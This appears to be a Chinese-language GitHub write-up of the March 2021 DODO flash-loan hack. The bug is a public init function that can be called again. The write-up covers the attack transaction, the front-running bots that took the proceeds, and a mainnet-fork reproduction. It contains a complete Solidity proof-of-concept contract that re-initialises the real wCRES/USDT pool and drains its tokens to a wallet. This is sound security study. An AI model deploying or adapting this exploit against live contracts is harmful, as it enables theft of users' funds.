# 0x00 概述

2021年3月,去中心化交易平台 DODO被黑客攻击的，仅仅 wCRES/USDT V2 一个交易对就被转走价值近 98 万美元的 wCRES 和近 114 万美元的 USDT.

漏洞原理其实比较简单，一句话描述就是`Init函数为Public且可被多次调用`.

但精彩的地方在于,攻击者并没有成功拿到超200万美金的赃款,而被Front Running Bot截了胡.

# 0x01 事件分析

* 攻击合约
```
0x910FD17B9Bfc42A6eEA822912f036EF5a080Be8A
```

* 攻击交易
```
0x395675b56370a9f5fe8b32badfa80043f5291443bd6c8273900476880fb5221e
```
![image](https://github.com/W2Ning/DODO_FlashLoan_Vul/blob/main/attack_tx.png)

* 问题代码如下

![image](https://github.com/W2Ning/DODO_FlashLoan_Vul/blob/main/vul_code.png)

> 攻击者首先生成两种垃圾Token
> 调用 `wCRES/USDT` 交易对合约的flashLoan函数 借出上百万美金的wCRES 和USDT
> 通过init 函数把两个Token 地址改为自己刚刚生成的两个垃圾Token
> 并把垃圾Token 还给交易对合约, 躲过require的检查

![image](https://github.com/W2Ning/DODO_FlashLoan_Vul/blob/main/require.png)

> 讽刺的是该合约声明了`notInitialized`的modifier,但是确并没有使用...

![image](https://github.com/W2Ning/DODO_FlashLoan_Vul/blob/main/modifier.png)

> 好玩的地方来了, 也许是攻击合约中的`Transfer Back`函数命名过于普通?并且同样为`Public`权限, 攻击者两次想把赃款从合约中提取出来的行为都被Bot监控到并且抢先提款,攻击者提了个寂寞...

![image](https://github.com/W2Ning/DODO_FlashLoan_Vul/blob/main/Front%20Running.png)


> 只能说Dark Forest名不虚传.

# 0x02 复现方法

* 攻击事件发生在高度为`12000165`的块上, 所以我们可以选稍早的块去Fork以太坊的主网

```
npx ganache-cli  --fork https://eth-mainnet.alchemyapi.io/v2/your_api_key@12000000
```

* 通过ERC20Factory 生成两个垃圾Token 

> 由于ganache拿不到正确的返回值，也查不到Event 
> 所以需要修改一下ERC20Factory合约
> 这样才能查到新生成的Token地址是什么...

![image](https://github.com/W2Ning/DODO_FlashLoan_Vul/blob/main/erc20_newToken.png)

![image](https://github.com/W2Ning/DODO_FlashLoan_Vul/blob/main/ERC20_factory.png)

![image](https://github.com/W2Ning/DODO_FlashLoan_Vul/blob/main/Add_Token_On_Metamask.png)

* 为了方便我已经手动把两个垃圾Token 打给了`wCRES/USDT` 交易对合约地址

* 攻击合约如下

```js
/**
 *Submitted for verification at Etherscan.io on 2021-01-22
*/

/*

    Copyright 2020 DODO ZOO.
    SPDX-License-Identifier: Apache-2.0

*/

pragma solidity 0.6.9;
pragma experimental ABIEncoderV2;

interface DVM{
    
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
    
    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;        
    
}


interface Token {
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
}


interface USDT{
    //USDT 并没有完全遵循 ERC20 标准 所以其接口需单独定义
    function transfer(address to, uint value) external;
    function balanceOf(address account) external view returns (uint);
}


contract poc{
    
    
    uint256 wCRES_amount =  130000000000000000000000;
    
    uint256 usdt_amount =  1100000000000;
    
    address wCRES_token = 0xa0afAA285Ce85974c3C881256cB7F225e3A1178a;
    
    address usdt_token = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    
    address maintainer = 0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0;
    

    // 这里是刚生产的Token1地址
    address token1 = 0xAB48b42e6a98e671ff58338D5dD2fE44409b82D6;
    // 这里是刚生产的Token2地址
    address token2 = 0x1469A47A1700Cdf4cF030c0Fc7F2f45F24008228;
    
    uint256 lpFeeRate = 3000000000000000;
    
    address mtFeeRateModel = 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01;
    
    uint256 i = 1;
    
    uint256 k = 1000000000000000000;
    
    bool isOpenTWAP = false;
    

    // 这里填你的测试地址
    address  wallet = 0x;
    
    address dvm_wCRES_USDT =  0x051EBD717311350f1684f89335bed4ABd083a2b6;
    
    function attack() public {
        
        address me = address(this);
        DVM DVM_wCRES_USDT = DVM(dvm_wCRES_USDT);
        DVM_wCRES_USDT.flashLoan(wCRES_amount,usdt_amount,me,"0x");
        
    }

    
    function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public{
        
        DVM DVM_wCRES_USDT = DVM(dvm_wCRES_USDT);
        DVM_wCRES_USDT.init(maintainer,token1,token2,lpFeeRate,mtFeeRateModel,i,k,isOpenTWAP);
        
        Token(wCRES_token).transfer(wallet, Token(wCRES_token).balanceOf(address(this)));
        USDT(usdt_token).transfer(wallet, Token(usdt_token).balanceOf(address(this)));
        
    }

}
```

* 攻击

![image](https://github.com/W2Ning/DODO_FlashLoan_Vul/blob/main/attack.png)

* 成功


![image](https://github.com/W2Ning/DODO_FlashLoan_Vul/blob/main/Success.png)
